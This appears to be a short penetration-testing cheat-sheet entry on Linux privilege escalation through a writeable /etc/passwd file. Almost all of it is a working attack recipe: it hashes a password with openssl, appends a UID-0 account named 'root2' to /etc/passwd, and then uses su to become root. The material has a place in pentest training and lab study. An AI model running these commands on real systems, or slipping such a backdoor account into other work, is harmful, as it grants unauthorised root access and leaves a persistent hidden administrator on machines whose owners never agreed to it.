# /etc/passwd

If /etc/passwd is **writeable**:

{% code overflow="wrap" %}
```sh
joe@debian-privesc:~$ openssl passwd w00t
Fdzt.eqJQ4s0g

joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
{% endcode %}

then su as root2 with specified password
